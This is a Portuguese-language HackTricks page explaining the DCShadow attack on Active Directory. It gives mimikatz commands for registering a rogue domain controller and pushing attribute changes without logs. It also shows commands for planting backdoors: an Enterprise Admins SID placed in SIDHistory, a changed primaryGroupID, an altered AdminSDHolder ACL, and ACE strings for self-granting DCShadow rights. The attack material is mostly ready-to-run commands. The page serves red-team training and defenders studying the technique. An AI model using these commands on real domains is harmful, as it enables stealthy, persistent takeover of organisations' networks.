<details>

<summary><strong>Aprenda hacking no AWS do zero ao herói com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras formas de apoiar o HackTricks:

* Se você quer ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF**, confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**material oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **Junte-se ao grupo** 💬 [**Discord**](https://discord.gg/hRep4RUj7f) ou ao grupo [**telegram**](https://t.me/peass) ou **siga-me** no **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Compartilhe suas técnicas de hacking enviando PRs para os repositórios do GitHub** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>


# DCShadow

Registra um **novo Controlador de Domínio** no AD e o utiliza para **inserir atributos** (SIDHistory, SPNs...) em objetos especificados **sem** deixar quaisquer **logs** referentes às **modificações**. Você **precisa de privilégios de DA** e estar dentro do **domínio raiz**.\
Note que se você usar dados incorretos, logs muito feios aparecerão.

Para realizar o ataque, você precisa de 2 instâncias do mimikatz. Uma delas iniciará os servidores RPC com privilégios de SYSTEM (você tem que indicar aqui as mudanças que deseja realizar), e a outra instância será usada para inserir os valores:

{% code title="mimikatz1 (servidores RPC)" %}
```bash
!+
!processtoken
lsadump::dcshadow /object:username /attribute:Description /value="My new description"
```
{% endcode %}

{% code title="mimikatz2 (push) - Necessita de DA ou similar" %}
```bash
lsadump::dcshadow /push
```
{% endcode %}

Observe que **`elevate::token`** não funcionará na sessão mimikatz1, pois isso elevou os privilégios da thread, mas precisamos elevar o **privilégio do processo**.\
Você também pode selecionar um objeto "LDAP": `/object:CN=Administrator,CN=Users,DC=JEFFLAB,DC=local`

Você pode aplicar as alterações a partir de um DA ou de um usuário com estas permissões mínimas:

* No **objeto do domínio**:
* _DS-Install-Replica_ (Adicionar/Remover Réplica no Domínio)
* _DS-Replication-Manage-Topology_ (Gerenciar Topologia de Replicação)
* _DS-Replication-Synchronize_ (Sincronização de Replicação)
* O **objeto Sites** (e seus filhos) no **contêiner de Configuração**:
* _CreateChild e DeleteChild_
* O objeto do **computador registrado como um DC**:
* _WriteProperty_ (Não Write)
* O **objeto alvo**:
* _WriteProperty_ (Não Write)

Você pode usar [**Set-DCShadowPermissions**](https://github.com/samratashok/nishang/blob/master/ActiveDirectory/Set-DCShadowPermissions.ps1) para conceder esses privilégios a um usuário sem privilégios (observe que isso deixará alguns logs). Isso é muito mais restritivo do que ter privilégios de DA.\
Por exemplo: `Set-DCShadowPermissions -FakeDC mcorp-student1 SAMAccountName root1user -Username student1 -Verbose`  Isso significa que o nome de usuário _**student1**_ quando logado na máquina _**mcorp-student1**_ tem permissões de DCShadow sobre o objeto _**root1user**_.

## Usando DCShadow para criar backdoors

{% code title="Definir Enterprise Admins no SIDHistory de um usuário" %}
```bash
lsadump::dcshadow /object:student1 /attribute:SIDHistory /value:S-1-521-280534878-1496970234-700767426-519
```
{% endcode %}

{% code title="Alterar PrimaryGroupID (colocar usuário como membro de Administradores de Domínio)" %}
```bash
lsadump::dcshadow /object:student1 /attribute:primaryGroupID /value:519
```
{% endcode %}

{% code title="Modificar ntSecurityDescriptor do AdminSDHolder (conceder Controle Total a um usuário)" %}
```bash
#First, get the ACE of an admin already in the Security Descriptor of AdminSDHolder: SY, BA, DA or -519
(New-Object System.DirectoryServices.DirectoryEntry("LDAP://CN=Admin SDHolder,CN=System,DC=moneycorp,DC=local")).psbase.Objec tSecurity.sddl
#Second, add to the ACE permissions to your user and push it using DCShadow
lsadump::dcshadow /object:CN=AdminSDHolder,CN=System,DC=moneycorp,DC=local /attribute:ntSecurityDescriptor /value:<whole modified ACL>
```
```markdown
{% endcode %}

## Shadowception - Conceder permissões DCShadow usando DCShadow (sem registros de permissões modificadas)

Precisamos adicionar as seguintes ACEs com o SID do nosso usuário no final:

* No objeto do domínio:
* `(OA;;CR;1131f6ac-9c07-11d1-f79f-00c04fc2dcd2;;UserSID)`
* `(OA;;CR;9923a32a-3607-11d2-b9be-0000f87a36b2;;UserSID)`
* `(OA;;CR;1131f6ab-9c07-11d1-f79f-00c04fc2dcd2;;UserSID)`
* No objeto do computador atacante: `(A;;WP;;;UserSID)`
* No objeto do usuário alvo: `(A;;WP;;;UserSID)`
* No objeto Sites no contêiner de Configuração: `(A;CI;CCDC;;;UserSID)`

Para obter a ACE atual de um objeto: `(New-Object System.DirectoryServices.DirectoryEntry("LDAP://DC=moneycorp,DC=loca l")).psbase.ObjectSecurity.sddl`

Note que, neste caso, você precisa fazer **várias alterações,** não apenas uma. Então, na **sessão mimikatz1** (servidor RPC) use o parâmetro **`/stack` com cada alteração** que você deseja fazer. Desta forma, você só precisará **`/push`** uma vez para realizar todas as alterações acumuladas no servidor desonesto.



[**Mais informações sobre DCShadow em ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/t1207-creating-rogue-domain-controllers-with-dcshadow)


<details>

<summary><strong>Aprenda hacking no AWS do zero ao herói com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Outras formas de apoiar o HackTricks:

* Se você quer ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF** Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
* Adquira o [**material oficial PEASS & HackTricks**](https://peass.creator-spring.com)
* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
* **Junte-se ao grupo** 💬 [**Discord**](https://discord.gg/hRep4RUj7f) ou ao grupo [**telegram**](https://t.me/peass) ou **siga-me** no **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Compartilhe suas dicas de hacking enviando PRs para os repositórios github** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).

</details>
```
